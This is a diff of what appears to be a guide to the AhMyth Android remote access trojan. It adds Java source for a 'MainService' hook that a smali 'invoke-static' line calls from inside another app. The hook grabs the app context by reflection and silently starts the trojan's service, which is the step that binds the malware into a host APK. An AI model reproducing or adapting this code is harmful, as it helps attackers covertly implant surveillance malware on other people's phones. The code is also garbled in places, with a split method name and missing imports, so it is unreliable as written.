@@ -5,81 +5,112 @@ invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 ## Java Files for new hook function
 - MainService.java
 ```java
-    private static void findContext() throws Exception {
+package ahmyth.mine.king.ahmyth;
 
-        Class<?> activityThreadClass;
+import android.app.AlarmManager;
 
-        try {
+import android.app.Notification;
 
-            activityThreadClass = Class.forName("android.app.ActivityThread");
+import android.app.NotificationChannel;
 
-        } catch (ClassNotFoundException e) {
+import android.app.NotificationManager;
 
-            // No context
+import android.app.PendingIntent;
 
-            return;
+import android.app.Service;
 
-        }
+import android.content.Context;
 
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+import android.content.Intent;
 
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+import android.graphics.Color;
 
-        if (context == null) {
+import android.os.Build;
 
-            // Post to the UI/Main thread and try and retrieve the Context
+import android.os.IBinder;
 
-            final Handler handler = new Handler(Looper.getMainLooper());
+import android.support.annotation.RequiresApi;
 
-            handler.post(new Runnable() {
+import android.support.v4.app.NotificationCompat;
 
-                public void run() {
+public class MainService extends Service {
 
-                    try {
+    private static Context contextOfApplication;
+        private static void findContext() throws Exception {
 
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+            Class<?> activityThreadClass;
 
-                        if (context != null) {
+            try {
 
-                            startService(context);
+                activityThreadClass = Class.forName("android.app.ActivityThread");
+
+            } catch (ClassNotFoundException e) {
+
+                // No context
+
+                return;
+
+            }
+
+            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+
+            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+            if (context == null) {
+
+                // Post to the UI/Main thread and try and retrieve the Context
+
+                final Handler handler = new Handler(Looper.getMainLooper());
+
+                handler.post(new Runnable() {
+
+                    public void run() {
+
+                        try {
+
+                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+
+                            if (context != null) {
+
+                            s    tartService(context);
+
+                            }
+
+                        } catch (Exception ignored) {
 
                         }
 
-                    } catch (Exception ignored) {
-
                     }
 
-                }
+                });
 
-            });
+            } else {
 
-        } else {
+                startService(context);
 
-            startService(context);
-
-        }
-
-    }
-
-    // Smali hook point
-
-    public static void start() {
-
-        try {
-
-            findContext();
-
-        } catch (Exception ignored) {
+            }
 
         }
 
-    }
+        // Smali hook point
+
+        public static void start() {
+
+            try {
+
+                findContext();
+
+            } catch (Exception ignored) {
+
+            }
+
+        }
     
-    public static void startService(Context context) {
+        public static void startService(Context context) {
 
-        context.startService(new Intent(context, MainService.class));
+            context.startService(new Intent(context, MainService.class));
 
-    }
+        }
 ```
 - ConnectionManager.java
 ```java
